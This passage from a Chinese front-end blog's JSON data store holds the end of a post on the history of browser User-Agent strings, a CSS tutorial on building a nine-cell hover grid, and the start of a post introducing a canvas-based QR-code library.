Guidelines](http://www.w3.org/TR/UAAG/)。至此，命运坎坷的UserAgent终于逐步走向规范。W3C大法好，有人说你怎么不早点来拯救世界呀！其实W3C一直在努力，但规范的制定，到推广至大家认可并执行，是一条漫长的道路，需要时间，也需要实践。\nW3C组织，在制定web标准这件工作之外，再我看来，还有两个身份：1、和事佬；2、背黑锅。和事不成，就得背黑锅。是的就是这样。\n\n###彩蛋\n\n那么，我们的故事接近尾声。还有一些有趣的小彩蛋。\n1. Chome 28开始，与苹果正式分道扬镳，采用Blink内核，但它的UserAgent并不改变。              \n2. 淘宝封杀微信打开淘宝页面，靠的就是微信内置浏览器UserAgent里的MicroMessenger字样。其实微信也可以像当初360一样把UserAgent去掉，但微信并不这样做。                \n3. 360出招之时留有后招。也许，它一开始就想到了腾讯会告他们对于UserAgent的欺瞒，因而它其实提供了设置项。默认设置是“保持跟IE一样的UserAgent”，但用户也可以不勾选。只是这选项比较隐蔽，而且你重启浏览器后…又会变回默认设置。如果没有这个小小的设置，结果大家可以自行想象。                \n4. 微软又玩新花样了，在泄露版IE 11中，去掉了以往的MSIE字样。初步猜测此举是为了使现有的 CSS hack 失效，避免过去网页设计师对IE差别对待的情况再度发生。但又会引发其他问题啊亲。\n\n--------------------\n\nEnd.\nLitten 2014.10.5\n","slug":"history-of-browser-useragent2","updated":1412682487000,"excerpt":"<p><img src=\"/assets/blogImg/browser-history2.jpg\" alt=\"其实应该叫做浏览器约架史\">    </p>\n<p>前篇<a href=\"/2014/09/26/history-of-browser-useragent/\">《浏览器野史 UserAgent列传（上）》</a></p>\n<h3 id=\"六、师夷长技\">六、师夷长技</h3>\n<p>前面说到，微软靠Windows系统捆绑IE销售。而Windows自然也有它的对手，Linux。一个技术快速发展的时代，系统的世界里也是战火纷飞。Linux系统自从有了可视化界面，也需要浏览器呀。桌面系统KDE的缔造者们就发明了一个。</p>\n","_id":"9c5bec82eb7nmwzu","categories":[],"photos":[],"link":""},{"layout":"post","title":"css实现九宫格(二)","date":1356069240000,"comments":true,"tags":["onq1addfunnbgl8n"],"content":"<p>书接上回，<a href=\"http://litten.github.com/2012/12/14/css-jiugongge/\" target=\"_blank\" rel=\"external\">上回在这</a>。</p>\n<blockquote>\n<p>9个元素，每个50*50px，排成九宫格<br>默认是border颜色为blue，hover到格子上变成red（兼容到IE6）</p>\n</blockquote>\n<p><img src=\"/assets/blogImg/jiugongge1.jpg\" alt=\"css题目\">     </p>\n<p>题目的关键是解决“公用边”，上次我主要做了两个方面的尝试：</p>\n<blockquote>\n<p>用负margin使元素的border叠加<br>用table的border-collapse实现边框合并</p>\n</blockquote>\n<p>这一次的思路则更加简明，也是个人认为是更好的方法。感谢<a href=\"http://weibo.com/u/1666828424\" target=\"_blank\" rel=\"external\">队长</a>提供的思路。</p>\n<p><a id=\"more\"></a></p>\n<h2 id=\"能不能不用border？\"><strong>能不能不用border？</strong></h2>\n<p><img src=\"/assets/blogImg/jiugongge10.jpg\" alt=\"一个格子的透视图，a其实充当了div的“边框”\"><br>如果不用border，怎么实现hover后，格子四周变红呢？那肯定是两个dom嵌套在一起，一大一小，小的dom作为“格子”，大的dom作为格子的红色“边框”。先看我初始化的一个格子设定：<br>html：     </p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"title\">div</span> <span class=\"attribute\">id</span>=<span class=\"value\">\"test\"</span>&gt;</span></div><div class=\"line\">　　<span class=\"tag\">&lt;<span class=\"title\">a</span> <span class=\"attribute\">href</span>=<span class=\"value\">\"#\"</span>&gt;</span><span class=\"tag\">&lt;<span class=\"title\">div</span>&gt;</span>1<span class=\"tag\">&lt;/<span class=\"title\">div</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"title\">a</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"title\">div</span>&gt;</span></div></pre></td></tr></table></figure>\n\n<p>初始css:</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"id\">#test</span> <span class=\"tag\">div</span><span class=\"rules\">{</span></div><div class=\"line\">　　<span class=\"rule\"><span class=\"attribute\">width</span>:<span class=\"value\"> <span class=\"number\">50px</span></span></span>;</div><div class=\"line\">　　<span class=\"rule\"><span class=\"attribute\">line-height</span>:<span class=\"value\"> <span class=\"number\">50px</span></span></span>;</div><div class=\"line\">　　<span class=\"rule\"><span class=\"attribute\">text-align</span>:<span class=\"value\">center</span></span>;</div><div class=\"line\">　　<span class=\"rule\"><span class=\"attribute\">background</span>:<span class=\"value\"> <span class=\"hexcolor\">#AAA</span></span></span>;</div><div class=\"line\"><span class=\"rule\">}</span></div><div class=\"line\"><span class=\"id\">#test</span> <span class=\"tag\">a</span><span class=\"rules\">{</span></div><div class=\"line\">　　<span class=\"rule\"><span class=\"attribute\">width</span>:<span class=\"value\"> <span class=\"number\">55px</span></span></span>;</div><div class=\"line\">　　<span class=\"rule\"><span class=\"attribute\">line-height</span>:<span class=\"value\"> <span class=\"number\">55px</span></span></span>;</div><div class=\"line\">　　<span class=\"rule\"><span class=\"attribute\">float</span>:<span class=\"value\"> left</span></span>;</div><div class=\"line\"><span class=\"rule\">}</span></div><div class=\"line\"><span class=\"id\">#test</span> <span class=\"tag\">a</span><span class=\"pseudo\">:hover</span><span class=\"rules\">{</span></div><div class=\"line\">　　<span class=\"rule\"><span class=\"attribute\">background</span>:<span class=\"value\"> red</span></span>;</div><div class=\"line\"><span class=\"rule\">}</span></div></pre></td></tr></table></figure>\n\n<p>css<br>由于a标签设置了宽度为55px，div标签设置了宽度为50px，这时候格子hover看起来只露出了<strong>右边</strong>的5px红色部分。          </p>\n<p>接下来，div添加属性<code>margin-top:5px;margin-right:5px</code>，这时可以显示<strong>上部</strong>的5px边框。再接着，在div的容器，也就是a标签设置<code>padding-left:5px;padding-bottom:5px;</code>，使格子<strong>左边框</strong>和<strong>下边框</strong>都显示出来。</p>\n<p><img src=\"/assets/blogImg/jiugongge8.jpg\" alt=\"完成一个格子的设置步骤\">      </p>\n<p>那么为什么要将a标签设置为55px，再进行一系列关于margin和padding的设置呢，原因我们最后再说。</p>\n<p>因此修改后的css为：</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"id\">#test</span> <span class=\"tag\">div</span><span class=\"rules\">{</span></div><div class=\"line\">　　<span class=\"rule\"><span class=\"attribute\">width</span>:<span class=\"value\"> <span class=\"number\">50px</span></span></span>;</div><div class=\"line\">　　<span class=\"rule\"><span class=\"attribute\">line-height</span>:<span class=\"value\"> <span class=\"number\">50px</span></span></span>;</div><div class=\"line\">　　<span class=\"rule\"><span class=\"attribute\">text-align</span>:<span class=\"value\">center</span></span>;</div><div class=\"line\">　　<span class=\"rule\"><span class=\"attribute\">background</span>:<span class=\"value\"> <span class=\"hexcolor\">#AAA</span></span></span>;</div><div class=\"line\">　　<span class=\"rule\"><span class=\"attribute\">margin-right</span>:<span class=\"value\"><span class=\"number\">5px</span></span></span>;</div><div class=\"line\">　　<span class=\"rule\"><span class=\"attribute\">margin-top</span>:<span class=\"value\"><span class=\"number\">5px</span></span></span>;</div><div class=\"line\"><span class=\"rule\">}</span></div><div class=\"line\"><span class=\"id\">#test</span> <span class=\"tag\">a</span><span class=\"rules\">{</span></div><div class=\"line\">　　<span class=\"rule\"><span class=\"attribute\">width</span>:<span class=\"value\"> <span class=\"number\">55px</span></span></span>;</div><div class=\"line\">　　<span class=\"rule\"><span class=\"attribute\">line-height</span>:<span class=\"value\"> <span class=\"number\">55px</span></span></span>;</div><div class=\"line\">　　<span class=\"rule\"><span class=\"attribute\">float</span>:<span class=\"value\"> left</span></span>;</div><div class=\"line\">　　<span class=\"rule\"><span class=\"attribute\">margin-right</span>:<span class=\"value\"> -<span class=\"number\">5px</span></span></span>;</div><div class=\"line\">　　<span class=\"rule\"><span class=\"attribute\">margin-bottom</span>:<span class=\"value\"> -<span class=\"number\">5px</span></span></span>;</div><div class=\"line\"><span class=\"rule\">}</span></div><div class=\"line\"><span class=\"id\">#test</span> <span class=\"tag\">a</span><span class=\"pseudo\">:hover</span><span class=\"rules\">{</span></div><div class=\"line\">　　<span class=\"rule\"><span class=\"attribute\">background</span>:<span class=\"value\"> red</span></span>;</div><div class=\"line\"><span class=\"rule\">}</span></div></pre></td></tr></table></figure>\n\n<h2 id=\"九个格子会怎样？\"><strong>九个格子会怎样？</strong></h2>\n<p>将a标签左浮动，同时添加到九个格子，这时候的效果是：两个格子之间会有10px的距离。</p>\n<p>为解决“公用边”问题，在a标签添加负值的margin：<code>margin-right:-5px;margin-bottom:-5px;</code>。最后将最外层的容器#test的宽度和高度设置为170px(50<em>3+5</em>4)，背景设置为蓝色。这时候大功告成了。</p>\n<p><img src=\"/assets/blogImg/jiugongge9.jpg\" alt=\"完成九个格子的设置步骤\">      </p>\n<p>最终的代码是：<br>html：      </p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"title\">div</span> <span class=\"attribute\">id</span>=<span class=\"value\">\"test\"</span>&gt;</span></div><div class=\"line\">　　<span class=\"tag\">&lt;<span class=\"title\">a</span> <span class=\"attribute\">href</span>=<span class=\"value\">\"\"</span>&gt;</span><span class=\"tag\">&lt;<span class=\"title\">div</span>&gt;</span>1<span class=\"tag\">&lt;/<span class=\"title\">div</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"title\">a</span>&gt;</span></div><div class=\"line\">　　<span class=\"tag\">&lt;<span class=\"title\">a</span> <span class=\"attribute\">href</span>=<span class=\"value\">\"\"</span>&gt;</span><span class=\"tag\">&lt;<span class=\"title\">div</span>&gt;</span>2<span class=\"tag\">&lt;/<span class=\"title\">div</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"title\">a</span>&gt;</span></div><div class=\"line\">　　<span class=\"tag\">&lt;<span class=\"title\">a</span> <span class=\"attribute\">href</span>=<span class=\"value\">\"\"</span>&gt;</span><span class=\"tag\">&lt;<span class=\"title\">div</span>&gt;</span>3<span class=\"tag\">&lt;/<span class=\"title\">div</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"title\">a</span>&gt;</span></div><div class=\"line\">　　<span class=\"tag\">&lt;<span class=\"title\">a</span> <span class=\"attribute\">href</span>=<span class=\"value\">\"\"</span>&gt;</span><span class=\"tag\">&lt;<span class=\"title\">div</span>&gt;</span>4<span class=\"tag\">&lt;/<span class=\"title\">div</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"title\">a</span>&gt;</span></div><div class=\"line\">　　<span class=\"tag\">&lt;<span class=\"title\">a</span> <span class=\"attribute\">href</span>=<span class=\"value\">\"\"</span>&gt;</span><span class=\"tag\">&lt;<span class=\"title\">div</span>&gt;</span>5<span class=\"tag\">&lt;/<span class=\"title\">div</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"title\">a</span>&gt;</span></div><div class=\"line\">　　<span class=\"tag\">&lt;<span class=\"title\">a</span> <span class=\"attribute\">href</span>=<span class=\"value\">\"\"</span>&gt;</span><span class=\"tag\">&lt;<span class=\"title\">div</span>&gt;</span>6<span class=\"tag\">&lt;/<span class=\"title\">div</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"title\">a</span>&gt;</span></div><div class=\"line\">　　<span class=\"tag\">&lt;<span class=\"title\">a</span> <span class=\"attribute\">href</span>=<span class=\"value\">\"\"</span>&gt;</span><span class=\"tag\">&lt;<span class=\"title\">div</span>&gt;</span>7<span class=\"tag\">&lt;/<span class=\"title\">div</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"title\">a</span>&gt;</span></div><div class=\"line\">　　<span class=\"tag\">&lt;<span class=\"title\">a</span> <span class=\"attribute\">href</span>=<span class=\"value\">\"\"</span>&gt;</span><span class=\"tag\">&lt;<span class=\"title\">div</span>&gt;</span>8<span class=\"tag\">&lt;/<span class=\"title\">div</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"title\">a</span>&gt;</span></div><div class=\"line\">　　<span class=\"tag\">&lt;<span class=\"title\">a</span> <span class=\"attribute\">href</span>=<span class=\"value\">\"\"</span>&gt;</span><span class=\"tag\">&lt;<span class=\"title\">div</span>&gt;</span>9<span class=\"tag\">&lt;/<span class=\"title\">div</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"title\">a</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"title\">div</span>&gt;</span></div></pre></td></tr></table></figure>\n\n<p>css：   </p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"id\">#test</span><span class=\"rules\">{</span></div><div class=\"line\">　　<span class=\"rule\"><span class=\"attribute\">width</span>:<span class=\"value\"> <span class=\"number\">170px</span></span></span>;</div><div class=\"line\">　　<span class=\"rule\"><span class=\"attribute\">height</span>:<span class=\"value\"><span class=\"number\">170px</span></span></span>;</div><div class=\"line\">　　<span class=\"rule\"><span class=\"attribute\">background</span>:<span class=\"value\"> blue</span></span>;</div><div class=\"line\">　　<span class=\"rule\"><span class=\"attribute\">margin</span>:<span class=\"value\"> <span class=\"number\">0</span> auto</span></span>;</div><div class=\"line\"><span class=\"rule\">}</span></div><div class=\"line\"><span class=\"id\">#test</span> <span class=\"tag\">div</span><span class=\"rules\">{</span></div><div class=\"line\">　　<span class=\"rule\"><span class=\"attribute\">width</span>:<span class=\"value\"> <span class=\"number\">50px</span></span></span>;</div><div class=\"line\">　　<span class=\"rule\"><span class=\"attribute\">line-height</span>:<span class=\"value\"> <span class=\"number\">50px</span></span></span>;</div><div class=\"line\">　　<span class=\"rule\"><span class=\"attribute\">text-align</span>:<span class=\"value\">center</span></span>;</div><div class=\"line\">　　<span class=\"rule\"><span class=\"attribute\">background</span>:<span class=\"value\"> <span class=\"hexcolor\">#AAA</span></span></span>;</div><div class=\"line\">　　<span class=\"rule\"><span class=\"attribute\">margin-right</span>:<span class=\"value\"><span class=\"number\">5px</span></span></span>;<span class=\"comment\">/*这句不要也可以*/</span></div><div class=\"line\">　　<span class=\"rule\"><span class=\"attribute\">margin-top</span>:<span class=\"value\"><span class=\"number\">5px</span></span></span>;</div><div class=\"line\"><span class=\"rule\">}</span></div><div class=\"line\"><span class=\"id\">#test</span> <span class=\"tag\">a</span><span class=\"rules\">{</span></div><div class=\"line\">　　<span class=\"rule\"><span class=\"attribute\">width</span>:<span class=\"value\"> <span class=\"number\">55px</span></span></span>;</div><div class=\"line\">　　<span class=\"rule\"><span class=\"attribute\">line-height</span>:<span class=\"value\"> <span class=\"number\">55px</span></span></span>;</div><div class=\"line\">　　<span class=\"rule\"><span class=\"attribute\">float</span>:<span class=\"value\"> left</span></span>;</div><div class=\"line\">　　<span class=\"rule\"><span class=\"attribute\">text-decoration</span>:<span class=\"value\"> none</span></span>;</div><div class=\"line\">　　<span class=\"rule\"><span class=\"attribute\">padding-left</span>:<span class=\"value\"> <span class=\"number\">5px</span></span></span>;</div><div class=\"line\">　　<span class=\"rule\"><span class=\"attribute\">padding-bottom</span>:<span class=\"value\"> <span class=\"number\">5px</span></span></span>;</div><div class=\"line\">　　<span class=\"rule\"><span class=\"attribute\">margin-right</span>:<span class=\"value\"> -<span class=\"number\">5px</span></span></span>;</div><div class=\"line\">　　<span class=\"rule\"><span class=\"attribute\">margin-bottom</span>:<span class=\"value\"> -<span class=\"number\">5px</span></span></span>;</div><div class=\"line\"><span class=\"rule\">}</span></div><div class=\"line\"><span class=\"id\">#test</span> <span class=\"tag\">a</span><span class=\"pseudo\">:hover</span><span class=\"rules\">{</span></div><div class=\"line\">　　<span class=\"rule\"><span class=\"attribute\">background</span>:<span class=\"value\"> red</span></span>;</div><div class=\"line\"><span class=\"rule\">}</span></div></pre></td></tr></table></figure>\n\n<h2 id=\"巧妙在哪里？\"><strong>巧妙在哪里？</strong></h2>\n<ul>\n<li>a标签hover前不设置背景色，露出最外层#test的蓝色背景，看起来格子有蓝色的边框；a标签hover时背景色设置为红色，充当了格子的红色边框；       </li>\n<li>a标签设置为55px是最关键的一点。按照此思路和题目要求，格子是50px大小，边框的dom应该是60px大小。而此时a设置为55px，因为a要设置<code>padding-left:5px;padding-bottom:5px;</code>，刚好a就有60px大小了；而a里面的div要设置<code>margin-top:5px;margin-right:5px</code>（其实margin-right也可以不加）,这时候margin和padding就达到了一个“中和”的效果，使布局不发生偏差。</li>\n</ul>\n<p>点此看<a href=\"/assets/demo/jiugongge_demo2.html\">demo</a>。</p>\n","source":"_posts/css-jiugongge2.markdown","raw":"---\nlayout: post\ntitle: \"css实现九宫格(二)\"\ndate: 2012-12-21 13:54\ncomments: true\ntags: \n\t- css\n---\n书接上回，[上回在这](http://litten.github.com/2012/12/14/css-jiugongge/)。\n\n> 9个元素，每个50*50px，排成九宫格\n> 默认是border颜色为blue，hover到格子上变成red（兼容到IE6）\n\n![css题目](/assets/blogImg/jiugongge1.jpg)     \n\n题目的关键是解决“公用边”，上次我主要做了两个方面的尝试：\n> 用负margin使元素的border叠加\n> 用table的border-collapse实现边框合并\n\n这一次的思路则更加简明，也是个人认为是更好的方法。感谢[队长](http://weibo.com/u/1666828424)提供的思路。\n\n<!-- more -->\n##**能不能不用border？**\n![一个格子的透视图，a其实充当了div的“边框”](/assets/blogImg/jiugongge10.jpg)      \n如果不用border，怎么实现hover后，格子四周变红呢？那肯定是两个dom嵌套在一起，一大一小，小的dom作为“格子”，大的dom作为格子的红色“边框”。先看我初始化的一个格子设定：         \nhtml：     \n```html\n\t<div id=\"test\">\n\t\t<a href=\"#\"><div>1</div></a>\n\t</div>\n```\n初始css:\n```css\n\t#test div{\n\t\twidth: 50px;\n\t\tline-height: 50px;\n\t\ttext-align:center;\n\t\tbackground: #AAA;\n\t}\n\t#test a{\n\t\twidth: 55px;\n\t\tline-height: 55px;\n\t\tfloat: left;\n\t}\n\t#test a:hover{\n\t\tbackground: red;\n\t}\n```css\n由于a标签设置了宽度为55px，div标签设置了宽度为50px，这时候格子hover看起来只露出了**右边**的5px红色部分。          \n\n接下来，div添加属性<code>margin-top:5px;margin-right:5px</code>，这时可以显示**上部**的5px边框。再接着，在div的容器，也就是a标签设置<code>padding-left:5px;padding-bottom:5px;</code>，使格子**左边框**和**下边框**都显示出来。\n\n![完成一个格子的设置步骤](/assets/blogImg/jiugongge8.jpg)      \n\n那么为什么要将a标签设置为55px，再进行一系列关于margin和padding的设置呢，原因我们最后再说。\n\n因此修改后的css为：\n```css\n\t#test div{\n\t\twidth: 50px;\n\t\tline-height: 50px;\n\t\ttext-align:center;\n\t\tbackground: #AAA;\n\t\tmargin-right:5px;\n\t\tmargin-top:5px;\n\t}\n\t#test a{\n\t\twidth: 55px;\n\t\tline-height: 55px;\n\t\tfloat: left;\n\t\tmargin-right: -5px;\n\t\tmargin-bottom: -5px;\n\t}\n\t#test a:hover{\n\t\tbackground: red;\n\t}\n```\n##**九个格子会怎样？**\n将a标签左浮动，同时添加到九个格子，这时候的效果是：两个格子之间会有10px的距离。\n\n为解决“公用边”问题，在a标签添加负值的margin：<code>margin-right:-5px;margin-bottom:-5px;</code>。最后将最外层的容器#test的宽度和高度设置为170px(50*3+5*4)，背景设置为蓝色。这时候大功告成了。\n\n![完成九个格子的设置步骤](/assets/blogImg/jiugongge9.jpg)      \n\n最终的代码是：       \nhtml：      \n```html     \n\t<div id=\"test\">\n\t\t<a href=\"\"><div>1</div></a>\n\t\t<a href=\"\"><div>2</div></a>\n\t\t<a href=\"\"><div>3</div></a>\n\t\t<a href=\"\"><div>4</div></a>\n\t\t<a href=\"\"><div>5</div></a>\n\t\t<a href=\"\"><div>6</div></a>\n\t\t<a href=\"\"><div>7</div></a>\n\t\t<a href=\"\"><div>8</div></a>\n\t\t<a href=\"\"><div>9</div></a>\n\t</div>\n```\ncss：   \n```css          \n\t#test{\n\t\twidth: 170px;\n\t\theight:170px;\n\t\tbackground: blue;\n\t\tmargin: 0 auto;\n\t}\n\t#test div{\n\t\twidth: 50px;\n\t\tline-height: 50px;\n\t\ttext-align:center;\n\t\tbackground: #AAA;\n\t\tmargin-right:5px;/*这句不要也可以*/\n\t\tmargin-top:5px;\n\t}\n\t#test a{\n\t\twidth: 55px;\n\t\tline-height: 55px;\n\t\tfloat: left;\n\t\ttext-decoration: none;\n\t\tpadding-left: 5px;\n\t\tpadding-bottom: 5px;\n\t\tmargin-right: -5px;\n\t\tmargin-bottom: -5px;\n\t}\n\t#test a:hover{\n\t\tbackground: red;\n\t}\n```\n##**巧妙在哪里？**\n+ a标签hover前不设置背景色，露出最外层#test的蓝色背景，看起来格子有蓝色的边框；a标签hover时背景色设置为红色，充当了格子的红色边框；       \n+ a标签设置为55px是最关键的一点。按照此思路和题目要求，格子是50px大小，边框的dom应该是60px大小。而此时a设置为55px，因为a要设置<code>padding-left:5px;padding-bottom:5px;</code>，刚好a就有60px大小了；而a里面的div要设置<code>margin-top:5px;margin-right:5px</code>（其实margin-right也可以不加）,这时候margin和padding就达到了一个“中和”的效果，使布局不发生偏差。\n\n点此看[demo](/assets/demo/jiugongge_demo2.html)。","slug":"css-jiugongge2","updated":1412681386000,"excerpt":"<p>书接上回，<a href=\"http://litten.github.com/2012/12/14/css-jiugongge/\" target=\"_blank\" rel=\"external\">上回在这</a>。</p>\n<blockquote>\n<p>9个元素，每个50*50px，排成九宫格<br>默认是border颜色为blue，hover到格子上变成red（兼容到IE6）</p>\n</blockquote>\n<p><img src=\"/assets/blogImg/jiugongge1.jpg\" alt=\"css题目\">     </p>\n<p>题目的关键是解决“公用边”，上次我主要做了两个方面的尝试：</p>\n<blockquote>\n<p>用负margin使元素的border叠加<br>用table的border-collapse实现边框合并</p>\n</blockquote>\n<p>这一次的思路则更加简明，也是个人认为是更好的方法。感谢<a href=\"http://weibo.com/u/1666828424\" target=\"_blank\" rel=\"external\">队长</a>提供的思路。</p>\n<p>","_id":"lusob7oc7mokplgp","categories":[],"photos":[],"link":""},{"layout":"post","title":"爱上一匹二维马可我家里没有草原…","date":1406908320000,"comments":true,"tags":["panvos05q85sf6qq","b689udghd6s571ss","w6w1sbbrofyval78","0554rycmagrgjpnt"],"content":"<h1 id=\"Kael-Qrcode\">Kael-Qrcode</h1>\n<blockquote>\n<p>基于html5 canvas，灵活轻巧，美观多变的二维码生成库                   </p>\n</blockquote>\n<p>一直觉得二维码长得太单一，抽空做了一个生成库：<a href=\"https://github.com/litten/Kael-Qrcode\" target=\"_blank\" rel=\"external\">github here</a>。<br>取名卡尔，缘由dota英雄Kael；一生二，二生三，三生万物 ，简单地配置Kael-Qrcode，帮助你变换出无穷样式的二维码。        </p>\n<p>二维码不应只是那只黑白的斑马，它还可以是骏马野马海马河马草泥马…<br><a id=\"more\"></a></p>\n<h3 id=\"使用_Usage:\">使用 Usage:</h3>\n<p><strong>1、入手</strong></p>\n<p><strong>Demo Base - 基本</strong></p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">var</span> kaelBase = <span class=\"keyword\">new</span> KaelQrcode();</div><div class=\"line\">kaelBase.init(<span class=\"built_in\">document</span>.getElementById(<span class=\"string\">\"qr-base\"</span>), <span class=\"string\">\"hello KaelQrcode\"</span>);</div></pre></td></tr></table></figure>\n\n<p><strong>2、进阶</strong></p>\n<p>随手可配，变化无穷！           </p>\n<p><strong>Demo Pic - “有图有真相”</strong></p>\n<p>关键词：附图，图片边框，尺寸            </p>\n<p><img src=\"http://littendomo.sinaapp.com/kaer-qrcode/qrcode-pic.jpg\" alt=\"demo\"></p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">var</span> kaelPic = <span class=\"keyword\">new</span> KaelQrcode();</div><div class=\"line\">kaelBase.init(<span class=\"built_in\">document</span>.getElementById(<span class=\"string\">\"qr-pic\"</span>), {</div><div class=\"line\">　　text : <span class=\"string\">\"hello KaelQrcode\"</span>,</div><div class=\"line\">　　size: <span class=\"number\">300</span>,</div><div class=\"line\">　　img: {</div><div class=\"line\">　　　　src : <span class=\"string\">\"kael-ico.jpg\"</span>,</div><div class=\"line\">　　　　border: <span class=\"string\">\"#fff\"</span></div><div class=\"line\">　　}</div><div class=\"line\">});</div></pre></td></tr></table></figure>\n\n<p><strong>Demo Sae - “如果大海能够带走我的哀愁”</strong>        </p>\n<p>关键词：圆角，前景色，背景色，渐变           </p>\n<p><img src=\"http://littendomo.sinaapp.com/kaer-qrcode/qrcode-sea.jpg\" alt=\"demo\"></p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">var</span> kaelSea = <span class=\"keyword\">new</span> KaelQrcode();</div><div class=\"line\">kaelSea.init(<span class=\"built_in\">document</span>.getElementById(<span class=\"string\">\"qr-sea\"</span>), {</div><div class=\"line\">　　text : <span class=\"string\">\"hello KaelQrcode\"</span>,</div><div class=\"line\">　　size: <span class=\"number\">300</span>,</div><div class=\"line\">　　color: {</div><div class=\"line\">　　　　<span class=\"string\">'0'</span>: <span class=\"string\">'rgb(1, 158, 213)'</span>,</div><div class=\"line\">　　　　<span class=\"string\">'0.2'</span>: <span class=\"string\">'rgb(30, 169, 224)'</span>,</div><div class=\"line\">　　　　<span class=\"string\">'0.6'</span>: <span class=\"string\">'rgb(0, 120, 191)'</span>,</div><div class=\"line\">　　　　<span class=\"string\">'1'</span>: <span class=\"string\">'rgb(1, 119, 255)'</span></div><div class=\"line\">　　},</div><div class=\"line\">　　background: <span class=\"string\">\"#d3e3f0\"</span>,</div><div class=\"line\">　　type: <span class=\"string\">\"round\"</span></div><div class=\"line\">});</div></pre></td></tr></table></figure>\n\n<p><strong>Demo Iron - “钢铁是怎样炼成的”</strong>     </p>\n<p>关键词：阴影            </p>\n<p><img src=\"http://littendomo.sinaapp.com/kaer-qrcode/qrcode-iron.jpg\" alt=\"demo\"></p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">var</span> kaelIron = <span class=\"keyword\">new</span> KaelQrcode();</div><div class=\"line\">kaelIron.init(<span class=\"built_in\">document</span>.getElementById(<span class=\"string\">\"qr-iron\"</span>), {</div><div class=\"line\">　　text : <span class=\"string\">\"hello KaelQrcode\"</span>,</div><div class=\"line\">　　size: <span class=\"number\">300</span>,</div><div class=\"line\">　　color: {</div><div class=\"line\">　　　　<span class=\"string\">'0'</span>: <span class=\"string\">'rgb(30, 30, 30)'</span>,</div><div class=\"line\">　　　　<span class=\"string\">'0.2'</span>: <span class=\"string\">'rgb(100, 100, 100)'</span>,</div><div class=\"line\">　　　　<span class=\"string\">'1'</span>: <span class=\"string\">'rgb(40, 40, 40)'</span></div><div class=\"line\">　